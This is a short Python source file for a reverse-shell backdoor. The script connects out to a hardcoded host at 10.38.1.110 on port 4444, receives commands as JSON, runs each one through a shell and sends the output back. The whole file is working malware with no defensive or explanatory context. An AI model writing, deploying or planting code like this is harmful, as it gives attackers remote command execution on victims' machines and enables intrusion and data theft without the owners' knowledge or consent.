import socket, subprocess, json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True).decode()

    def run(self):
        while True:
            command = self.reliable_recieve()
            if command[0] == 'exit':
                self.connection.close()
                exit()
            
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

my_backdoor = Backdoor('10.38.1.110', 4444)
my_backdoor.run()